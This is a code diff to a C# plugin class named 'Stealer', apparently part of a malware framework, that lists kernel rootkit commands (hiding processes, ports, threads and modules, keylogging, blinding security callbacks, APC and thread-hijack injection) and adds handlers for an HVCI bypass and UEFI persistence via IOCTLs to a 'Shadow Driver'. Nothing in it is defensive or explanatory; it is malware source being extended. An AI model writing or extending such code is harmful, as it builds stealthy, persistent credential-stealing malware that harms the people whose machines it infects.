@@ -126,7 +126,8 @@ public sealed class Stealer : IUniversalPlugin
     get => new string[] { 
         "collect", "kernel_hide", "kernel_elevate", "kernel_protect", "kernel_keylog", "kernel_blind",
         "kernel_hide_port", "kernel_clean_callbacks", "kernel_ghost_reg", "kernel_inject_apc", "kernel_inject_hijack",
-        "kernel_hide_thread", "kernel_hide_module", "kernel_terminate", "kernel_block_driver", "kernel_protect_reg_key", "kernel_protect_reg_val"
+        "kernel_hide_thread", "kernel_hide_module", "kernel_terminate", "kernel_block_driver", "kernel_protect_reg_key", "kernel_protect_reg_val",
+        "kernel_hvci_bypass", "kernel_uefi_persist"
     };
   }
 
@@ -397,6 +398,34 @@ public sealed class Stealer : IUniversalPlugin
                 output = success ? "Registry value protected." : "Failed to protect registry value.";
               }
               else { output = "Invalid parameters. Use: key|value"; success = false; }
+            }
+            else { output = "Failed to connect to Shadow Driver."; success = false; }
+          }
+          return new PluginResult() { Success = success, Message = output };
+
+        case "kernel_hvci_bypass":
+          using (var dev = new KernelController())
+          {
+            if (dev.Connect())
+            {
+              // Send HVCI_BYPASS IOCTL with empty struct (or a simple trigger byte)
+              var trigger = new KernelController.TargetProcess { Pid = IntPtr.Zero, Enable = true };
+              success = dev.SendIoctl(KernelController.HVCI_BYPASS, ref trigger);
+              output = success ? "HVCI Bypass attempt sent to Kernel." : "HVCI Bypass failed. Kernel may not support this yet.";
+            }
+            else { output = "Failed to connect to Shadow Driver."; success = false; }
+          }
+          return new PluginResult() { Success = success, Message = output };
+
+        case "kernel_uefi_persist":
+          using (var dev = new KernelController())
+          {
+            if (dev.Connect())
+            {
+              // Send UEFI_PERSIST IOCTL (placeholder - actual payload path would be passed)
+              var trigger = new KernelController.TargetProcess { Pid = IntPtr.Zero, Enable = true };
+              success = dev.SendIoctl(KernelController.UEFI_PERSIST, ref trigger);
+              output = success ? "UEFI Persistence attempt sent to Kernel." : "UEFI Persistence failed. Kernel may not support this yet.";
             }
             else { output = "Failed to connect to Shadow Driver."; success = false; }
           }
